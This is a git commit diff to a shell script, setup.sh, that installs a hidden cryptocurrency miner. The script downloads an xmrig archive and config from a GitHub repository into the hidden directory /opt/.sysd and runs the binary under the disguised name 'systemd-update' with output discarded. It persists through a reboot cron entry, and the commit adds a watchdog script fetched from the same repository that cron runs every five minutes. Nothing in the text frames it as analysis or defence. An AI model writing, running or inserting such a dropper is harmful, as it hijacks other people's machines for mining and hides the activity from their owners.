9ca89e65d4c7d77f3e367b3ebaa40cd6587e7c5a
ThipyThipy <thipypro@gmail.com>
2025-03-24 22:45:54 +0100

    update setup.sh

--- setup.sh
+++ setup.sh
@@ -4,9 +4,11 @@ mkdir -p /opt/.sysd && cd /opt/.sysd
 
 curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/xmrig.tar.gz -o miner.tar.gz
 curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/config.json -o config.json
+curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/watchdog.py -o watchdog.py
 
 tar -xzf miner.tar.gz
 chmod +x systemd-update
 
 nohup ./systemd-update > /dev/null 2>&1 &
 (crontab -l 2>/dev/null; echo "@reboot /opt/.sysd/systemd-update") | crontab -
+(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/python3 /opt/.sysd/watchdog.py") | crontab -
